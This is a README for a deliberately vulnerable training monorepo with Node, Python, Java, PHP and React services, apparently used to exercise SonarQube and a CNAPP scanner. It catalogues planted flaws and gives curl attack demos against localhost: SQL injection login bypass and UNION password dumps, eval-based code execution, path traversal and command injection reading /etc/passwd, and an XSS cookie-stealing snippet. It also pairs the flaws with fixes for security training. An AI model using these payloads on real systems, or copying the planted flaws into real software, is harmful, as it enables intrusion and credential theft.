# 🏢 MegaCorp – Mega Test Project
## A Complete Multi-Service Monorepo for SonarQube + Tigergate Security Testing

<p align="center">
  <img src="https://img.shields.io/badge/Stack-React%20|%20Node.js%20|%20Python%20|%20Java%20|%20PHP-blue?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/SAST-SonarQube-orange?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Security-Tigergate%20CNAPP-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Infra-Docker%20%7C%20K8s-2496ED?style=for-the-badge"/>
</p>

> ⚠️ **EDUCATIONAL USE ONLY** – This project is **intentionally vulnerable**. Never deploy it on a public server or production system.

---

## 📋 Table of Contents
1. [What is this project?](#-what-is-this-project)
2. [Architecture](#-architecture)
3. [Intentional Issues Summary](#-intentional-issues-by-service)
4. [Quick Start](#-quick-start)
5. [Commands Reference](#-commands-reference)
6. [SonarQube Setup & Scan](#-sonarqube-setup--scan)
7. [Testing Endpoints (curl)](#-testing-endpoints)
8. [Breaking Things (Demo Attacks)](#-breaking-things--attack-demos)
9. [Learning Section for Freshers](#-learning-section-for-freshers)

---

## 🎯 What is this project?

This is a **full-stack monorepo** that simulates a **real company's internal application** — but with dozens of intentional security vulnerabilities, code smells, and bad practices baked in.

It is designed to:
- **Trigger maximum findings** in SonarQube SAST and Tigergate CNAPP
- **Teach freshers** what real vulnerabilities look like and why they are dangerous
- **Run locally** with a single `docker compose up` command

**Services included:**

| Service | Language | Port | Purpose |
|---------|----------|------|---------|
| `frontend` | React + Vite | 5173 | Web UI with XSS demos |
| `backend-node` | Node.js + Express | 3000 | REST API with SQL injection |
| `backend-python` | Python + Flask | 5000 | REST API with RCE via eval() |
| `backend-java` | Spring Boot | 8080 | REST API with IDOR & SQLi |
| `vulnerable-php` | PHP 7.4 | 8888 | DVWA-style attack playground |
| `mysql` | MySQL 8.0 | 3306 | Database (plain text passwords) |

---

## 🏗️ Architecture

```
                          ┌─────────────────────────────────────────┐
                          │          Docker Network: mega_network   │
                          │                                         │
  Browser ──HTTP──► :5173 │  [Frontend: React + Vite]              │
                          │       │ Calls APIs on:                  │
  Curl ────────────► :3000 │  [Node.js Express] ──SQL──► [MySQL]   │
  Curl ────────────► :5000 │  [Python Flask]    ──SQL──► [MySQL]   │
  Curl ────────────► :8080 │  [Spring Boot]     ──SQL──► [MySQL]   │
  Curl ────────────► :8888 │  [PHP App]         ──SQL──► [MySQL]   │
                          │                        :3306            │
  SonarQube ──────► Scans all source code          │               │
  Tigergate ──────► Monitors runtime + IaC         │               │
                          └─────────────────────────────────────────┘
```

---

## 💣 Intentional Issues by Service

### 🖥️ Frontend (React + Vite)
| Issue | File | SonarQube Rule |
|-------|------|----------------|
| `dangerouslySetInnerHTML` without sanitization | `App.jsx` | S5247 – XSS |
| `eval()` used for dynamic page titles | `App.jsx` | S1523 – Code injection |
| API key hardcoded in frontend source | `App.jsx` | S6418 – Credentials |
| JWT stored in `localStorage` | `App.jsx` | S5332 – Sensitive storage |
| Password logged to console | `App.jsx` | S4244 – Credentials in log |
| Source maps enabled in build | `vite.config.js` | Code disclosure |

### 🟢 Node.js Backend
| Issue | File | SonarQube Rule |
|-------|------|----------------|
| SQL Injection (×6 endpoints) | `server.js` | S3649 – SQL injection |
| OS Command Injection `/api/run-command` | `server.js` | S4721 – Command injection |
| Hardcoded JWT secret | `server.js` | S6418 – Credentials |
| N+1 query in `/api/orders` | `server.js` | Performance |
| Password logged in plain text | `server.js` | S4244 |
| Stack trace returned to client | `server.js` | S4507 – Info disclosure |
| CORS wildcard `*` | `server.js` | S5122 – CORS |
| IDOR on `/api/users/:id` | `server.js` | Access control |

### 🐍 Python Flask Backend
| Issue | File | SonarQube Rule |
|-------|------|----------------|
| SQL Injection via f-string | `app.py` | S3649 |
| `eval()` RCE at `/api/calc` | `app.py` | S1523 |
| Path Traversal at `/api/file` | `app.py` | S2083 |
| `yaml.load()` Deserialization | `app.py` | S5247 |
| OS Command Injection `os.popen()` | `app.py` | S4721 |
| Debug mode enabled | `app.py` | S4507 |
| Bare `except:` block | `app.py` | S1722 |
| Platform info in 404 response | `app.py` | S4507 |

### ☕ Java Spring Boot Backend
| Issue | File | SonarQube Rule |
|-------|------|----------------|
| SQL Injection in 4 endpoints | `UserController.java` | S3649 |
| IDOR – no auth on `/users/{id}` | `UserController.java` | Access control |
| Password in log.info() | `UserController.java` | S4244 |
| DB password returned in `/api/admin` | `UserController.java` | S6418 |
| Unused private fields | `UserController.java` | S1068 – Dead code |
| `ddl-auto=update` in production | `application.properties` | S4507 |
| All Actuator endpoints exposed | `application.properties` | S4507 |
| Stack traces in API responses | `application.properties` | S4507 |
| CORS wildcard in config | `Application.java` | S5122 |

### 🐘 PHP App (DVWA-Style)
| Issue | File | SonarQube Rule |
|-------|------|----------------|
| SQL Injection (×3 pages) | `index.php` | S3649 |
| Reflected XSS | `index.php` | S5247 |
| Stored XSS (via DB) | `index.php` | S5247 |
| Path Traversal (LFI) | `index.php` | S2083 |
| OS Command Injection `shell_exec()` | `index.php` | S4721 |
| Unrestricted file upload | `index.php` | S5042 |
| `phpinfo()` exposure | `index.php` | S4507 |
| `extract($_GET)` variable injection | `index.php` | S5328 |
| No CSRF tokens on any form | `index.php` | S4502 |

### 🐳 Docker + K8s Issues (Tigergate / CSPM)
| Issue | File |
|-------|------|
| Containers running as root | All Dockerfiles |
| EOL base images (node:16, php:7.4, python:3.9) | Dockerfiles |
| DB port 3306 exposed to host | `docker-compose.yml` |
| MySQL password in K8s env (not Secret) | `k8s/mysql-deployment.yaml` |
| `privileged: true` container | `k8s/backend-node-deployment.yaml` |
| No resource limits on containers | All K8s deployments |
| No network policies | K8s manifests |
| No PersistentVolumeClaim for MySQL | `k8s/mysql-deployment.yaml` |

---

## 🚀 Quick Start

### Step 1 — Clone or navigate to the project

```bash
cd mega-test-project
```

### Step 2 — Run setup (checks prerequisites + starts all services)

```bash
chmod +x scripts/setup.sh
./scripts/setup.sh
```

### Step 3 — Or just use Docker Compose directly

```bash
docker compose up --build
```

### Step 4 — Open the frontend

```
http://localhost:5173
```

---

## 📖 Commands Reference

```bash
# ─── Start / Stop ──────────────────────────────────────────────
docker compose up             # Start all services (attach mode)
docker compose up -d          # Start all services (background)
docker compose down           # Stop and remove containers
docker compose restart        # Restart all services
docker compose logs -f        # Follow all service logs
docker compose logs backend-node -f   # Follow specific service log

# ─── SonarQube ─────────────────────────────────────────────────
# Start SonarQube (first time):
docker run -d --name sonarqube -p 9000:9000 sonarqube:community

# Run scan (after setting token):
export SONAR_TOKEN=your_token_here
./scripts/scan.sh

# ─── Database ──────────────────────────────────────────────────
docker compose exec mysql mysql -uroot -proot123 megadb
# Then run SQL:
# SELECT * FROM users;
# SELECT * FROM products;

# ─── Debug individual service ───────────────────────────────────
docker compose exec backend-node sh
docker compose exec backend-python bash
docker compose exec vulnerable-php bash
```

---

## 📊 SonarQube Setup & Scan

### Step 1 — Start SonarQube

```bash
docker run -d \
  --name sonarqube \
  -p 9000:9000 \
  sonarqube:community
```

Wait ~2 minutes, then go to: **http://localhost:9000**

### Step 2 — First Login

- Username: `admin`
- Password: `admin`
- It will ask you to change the password

### Step 3 — Create a Project

1. Click **"Create Project"**
2. Project key: `mega-test-project`
3. Choose **"Locally"**
4. Generate a token — copy it

### Step 4 — Run the Scan

```bash
export SONAR_TOKEN=your_token_here
./scripts/scan.sh
```

### Step 5 — View Results

Go to: **http://localhost:9000/dashboard?id=mega-test-project**

You should see **100+ issues** flagged across all 5 services! 🎉

---

## 🧪 Testing Endpoints

### Node.js API (port 3000)

```bash
# List all users (no auth needed — BAD!)
curl http://localhost:3000/api/users

# SQL Injection demo — returns all users when search=' OR '1'='1
curl "http://localhost:3000/api/users?search=' OR '1'='1"

# OS Command Injection (CRITICAL!)
curl "http://localhost:3000/api/run-command?cmd=id"
curl "http://localhost:3000/api/run-command?cmd=cat+/etc/passwd"

# Login (try SQL injection)
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' --", "password": "anything"}'

# Get specific user (IDOR — no auth check)
curl http://localhost:3000/api/users/1
curl http://localhost:3000/api/users/2

# Get orders (N+1 query demo)
curl http://localhost:3000/api/orders
```

### Python Flask API (port 5000)

```bash
# List products
curl http://localhost:5000/api/products

# SQL Injection
curl "http://localhost:5000/api/products?search=Laptop' UNION SELECT 1,username,password,email,1 FROM users --"

# RCE via eval()
curl "http://localhost:5000/api/calc?expr=1+1"
curl "http://localhost:5000/api/calc?expr=__import__('os').popen('id').read()"

# Path Traversal
curl "http://localhost:5000/api/file?name=/etc/hostname"
curl "http://localhost:5000/api/file?name=../../etc/passwd"

# OS Command Injection
curl "http://localhost:5000/api/os-command?cmd=id"
curl "http://localhost:5000/api/os-command?cmd=ls+-la+/"
```

### Java Spring Boot API (port 8080)

```bash
# List users
curl http://localhost:8080/api/users

# SQL Injection
curl "http://localhost:8080/api/users?search=' OR '1'='1"

# IDOR — access any user
curl http://localhost:8080/api/users/1

# Admin endpoint (NO AUTH REQUIRED!)
# This returns ALL passwords and the DB connection string!
curl http://localhost:8080/api/admin

# Login
curl -X POST http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

### PHP App (port 8888)

```
Open in browser: http://localhost:8888

Test SQL Injection:  http://localhost:8888?page=sqli&id=1 OR 1=1
Test XSS:           http://localhost:8888?page=xss&name=<script>alert(1)</script>
Test Path Traversal: http://localhost:8888?page=fileread&filename=/etc/passwd
Test Command Exec:  http://localhost:8888?page=exec&cmd=id
Test PHP Info:      http://localhost:8888?page=info
```

---

## 💥 Breaking Things – Attack Demos

### Demo 1: SQL Injection (Bypass Login)

```bash
# This logs in as admin WITHOUT knowing the password!
# How? The SQL becomes: SELECT * FROM users WHERE username='admin' --' AND password='...'
# The --' comments out the password check!
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "doesnt matter"}'
```

### Demo 2: Remote Code Execution (eval in Python)

```bash
# This runs OS commands through Python's eval()
# The __import__('os').popen('id').read() executes shell commands!
curl "http://localhost:5000/api/calc?expr=__import__('os').popen('whoami').read()"
```

### Demo 3: Path Traversal (Read /etc/passwd)

```bash
# This reads the server's password file!
# The ../../ traverses up out of the intended directory
curl "http://localhost:5000/api/file?name=../../etc/passwd"
```

### Demo 4: OS Command Injection (Node.js)

```bash
# This runs any shell command on the server!
curl "http://localhost:3000/api/run-command?cmd=ls+-la+/etc"
```

### Demo 5: Unauthenticated Admin Endpoint (Spring Boot)

```bash
# Returns all user passwords AND the database connection password!
curl http://localhost:8080/api/admin | python3 -m json.tool
```

---

## 📘 Learning Section for Freshers

### 🔰 What is SonarQube?
SonarQube is a tool that reads your source code and automatically detects:
- **Vulnerabilities** (security holes)
- **Bugs** (code that will likely crash)
- **Code Smells** (bad habits that make code hard to maintain)

Think of it as a "spell checker" but for security and code quality!

### 🔰 What is Tigergate?
Tigergate is a CNAPP (Cloud Native Application Protection Platform). It:
- Scans your **Docker images** for known CVEs
- Checks your **Kubernetes** configs for security misconfigurations
- Monitors **runtime behavior** for attacks happening live

### 🔰 What is SQL Injection?
When you build SQL queries by joining user input with strings, attackers can "inject" extra SQL commands.

**Vulnerable code (Node.js):**
```javascript
// BAD: User input goes directly into SQL!
const query = "SELECT * FROM users WHERE username = '" + username + "'";
```

**Attack:** Set `username = "admin' --"` and the SQL becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
-- The password check is commented out! Login bypass!
```

**Fixed code:**
```javascript
// GOOD: Use parameterized queries — user input never touches SQL syntax
const query = "SELECT * FROM users WHERE username = ?";
db.query(query, [username], callback);
```

### 🔰 What is XSS (Cross-Site Scripting)?
When a website shows user input directly in the HTML without sanitizing it, attackers can inject JavaScript that runs in other users' browsers.

**Vulnerable code (React):**
```jsx
// BAD: This renders raw HTML from user input!
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

**Attack:** Set `userInput = "<script>document.cookie = 'stolen=' + document.cookie</script>"`

**Fixed code:**
```jsx
// GOOD: Just show it as text, not HTML
<div>{userInput}</div>  // React escapes this automatically
```

### 🔰 Why are hardcoded passwords dangerous?
If your source code (with hardcoded passwords) is:
- Pushed to a public GitHub repo accidentally
- Leaked in a data breach
- Seen by a disgruntled employee

...attackers have your database password! Use environment variables instead.

### 🔰 Summary of Rules

| ❌ Bad Practice | ✅ Good Practice |
|----------------|-----------------|
| String concat in SQL queries | Parameterized queries |
| `dangerouslySetInnerHTML` without sanitize | Use React rendering or DOMPurify |
| `eval(user_input)` | Never use eval with user input |
| Hardcoded passwords in code | Environment variables / secrets manager |
| `yaml.load()` without SafeLoader | `yaml.safe_load()` |
| `shell_exec(user_input)` | Validate against allowlist, avoid exec |
| `localStorage` for JWT tokens | httpOnly cookies |
| Passwords in log files | Never log sensitive data |
| Running containers as root | `USER nonroot` in Dockerfile |
| `privileged: true` in K8s | Drop all capabilities |

---

## 📁 Project Structure

```
mega-test-project/
├── frontend/               React + Vite UI app
│   ├── src/
│   │   ├── App.jsx         XSS, eval(), hardcoded API key
│   │   └── main.jsx        StrictMode disabled
│   ├── Dockerfile          Root user, node:18
│   ├── package.json
│   └── vite.config.js      CORS wildcard, source maps
│
├── backend-node/           Node.js Express API
│   ├── server.js           SQLi, cmd injection, N+1, IDOR
│   ├── Dockerfile          EOL node:16, root user
│   └── package.json
│
├── backend-python/         Python Flask API
│   ├── app.py              SQLi, eval RCE, path traversal, YAML RCE
│   ├── Dockerfile          Root user, debug mode
│   └── requirements.txt    Old vulnerable dependencies
│
├── backend-java/           Spring Boot API
│   ├── src/main/java/com/megacorp/
│   │   ├── Application.java    CORS wildcard, pwd at startup
│   │   └── UserController.java SQLi, IDOR, N+1, admin endpoint
│   ├── src/main/resources/
│   │   └── application.properties  Hardcoded creds, ddl-auto=update
│   ├── Dockerfile          Full JDK, source in image
│   └── pom.xml             Old Spring Boot, devtools in prod
│
├── vulnerable-php/         DVWA-style PHP app
│   ├── index.php           SQLi, XSS, LFI, cmd injection, upload
│   └── Dockerfile          PHP 7.4 EOL, display_errors On
│
├── database/
│   └── init.sql            Plain text passwords, over-privileged users
│
├── k8s/
│   ├── namespace.yaml      No network policies, no quotas
│   ├── frontend-deployment.yaml    No resource limits
│   ├── backend-node-deployment.yaml privileged:true
│   └── mysql-deployment.yaml       Hardcoded pwd, no PVC
│
├── .github/workflows/
│   └── ci.yml              Hardcoded secrets, skipped tests, ignored failures
│
├── scripts/
│   ├── setup.sh            Start the project
│   └── scan.sh             Run SonarQube scan
│
├── docker-compose.yml      All services + hardcoded creds
├── sonar-project.properties Multi-language SonarQube config
└── README.md               This file
```

---

*Made with ❤️ for SonarQube + Tigergate CNAPP training. Remember: these vulnerabilities are here to learn from — always write secure code in real projects!*
